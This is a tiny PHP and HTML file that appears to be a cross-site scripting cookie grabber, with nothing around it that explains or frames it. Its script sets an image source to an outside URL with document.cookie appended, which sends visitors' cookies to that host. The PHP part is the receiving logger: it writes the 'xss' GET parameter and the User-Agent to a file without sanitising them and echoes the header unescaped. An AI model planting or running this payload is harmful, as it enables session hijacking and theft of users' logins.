<?php
$browser = get_browser(null, true);

$file = fopen('test', 'wb');

fwrite($file, $_SERVER['HTTP_USER_AGENT'] . "\n\n");
fwrite($file, $_GET['xss']);
echo $browser;
echo $_SERVER['HTTP_USER_AGENT'];

?>
<img id="xss" src=""/>
<script>
document.getElementById('xss').src = "https://liamanderson.co.uk/test/?xss=" + document.cookie;
</script>